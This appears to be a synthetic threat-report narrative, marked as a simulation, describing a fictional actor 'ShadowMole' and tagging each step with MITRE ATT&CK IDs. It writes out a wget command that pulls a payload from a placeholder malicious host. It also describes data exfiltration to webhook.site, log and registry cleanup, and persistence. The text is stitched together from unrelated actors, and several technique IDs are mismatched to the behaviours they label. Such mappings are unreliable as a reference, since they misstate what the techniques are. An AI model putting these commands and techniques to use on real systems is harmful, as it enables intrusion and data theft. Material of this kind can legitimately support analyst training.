ShadowMole likely conducted reconnaissance by using nmap.exe with the -O flag to perform operating system detection on target systems [T1592.001] while simultaneously querying the victim's corporate website for team member bios to identify roles [T1591.004]. Using automated tools, the adversary performed password spraying against AWS IAM users with common corporate passwords [T1586.003]. The actors sent spearphishing emails with malicious links included [T1566.002], which, when clicked, downloaded a malicious backdoor.exe to enable remote command execution on infected hosts [T1587.001]. System logs from the victim's environment show normal user activity during this period, with no immediate alerts triggered. The adversary employed a malicious.lnk file to disguise a command that downloads spyware onto the system [T1027.012] and used PowerShell to actively collect system information and send it to a webhook.site address [T1567.004] while simultaneously modifying registry keys to cover tracks of remote access by deleting the HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers registry data [T1070.007]. On compromised hosts, the threat actor used svchost.exe to execute a malicious DLL that enabled remote command execution capabilities [T1569] and installed a com.apple.softwareupdate.plist file in the /LaunchAgents folder with the RunAtLoad value set to true to ensure persistence on macOS systems [T1543.001]. The backdoor executed /usr/bin/security set-trust-settings to modify certificate trust policies [T1553.004] and ran 'docker exec malicious_container wget http://malicious.site/payload.sh' to download additional tools [T1609]. AADInternals was used to create SAML tokens using the AD Federated Services token signing certificate [T1606.002], and APT39 has used the post exploitation tool CrackMapExec to enumerate network shares [T1135]. The trojan searched system logs for 'malware.exe' entries to assess detection status [T1497.002], and RansomHub can use a proxy to connect to remote SFTP servers [T1090]. Incident response teams noted increased network traffic to unknown IPs, but no data loss was confirmed in this simulation.
